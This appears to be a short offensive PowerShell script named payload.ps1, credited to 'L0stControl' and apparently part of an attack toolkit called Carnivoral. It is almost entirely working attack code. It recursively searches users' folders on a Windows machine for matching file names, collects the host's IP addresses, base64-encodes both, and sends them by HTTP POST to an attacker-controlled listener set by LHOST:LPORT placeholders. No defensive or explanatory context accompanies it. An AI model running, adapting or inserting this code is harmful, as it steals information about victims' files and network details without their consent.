#===============================================================
# Title           :payload.ps1
# Description     :Carnivoral powerShell payload to search files
# Authors         :L0stControl
# Date            :2018/04/12
# Version         :0.0.1    
#===============================================================

function Search-files
{
    $global:resultSearch = Get-ChildItem -Path "C:\\Users\" -Include *.* -Force -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "MATCH" } |ConvertTo-CSV   
}    

function Invoke-files
{
    $body = [System.Text.Encoding]::UTF8.GetBytes($global:resultSearch)
    $body = [Convert]::ToBase64String($body)
    $ip = Get-Wmiobject -Class Win32_NetworkAdapterConfiguration -Filter 'IPEnabled = True' | Format-table -Property IPAddress |Out-string 
    $ip = [System.Text.Encoding]::UTF8.GetBytes($ip)
    $ip = [Convert]::ToBase64String($ip)
    $url= "http://LHOST:LPORT/content"
    $request = [System.Net.WebRequest]::Create($url)
    $request.ContentType = "application/x-www-form-urlencoded"
    $request.Method = "POST"

    try
    {
        $requestStream = $request.GetRequestStream()
        $streamWriter = New-Object System.IO.StreamWriter($requestStream)
        $streamWriter.Write("filecontent=$body&ip=$ip")
    }
    finally
    {
        if ($null -ne $streamWriter) { $streamWriter.Dispose() }
        if ($null -ne $requestStream) { $requestStream.Dispose() }
    }
    $res = $request.GetResponse()
}

Search-files
Invoke-files
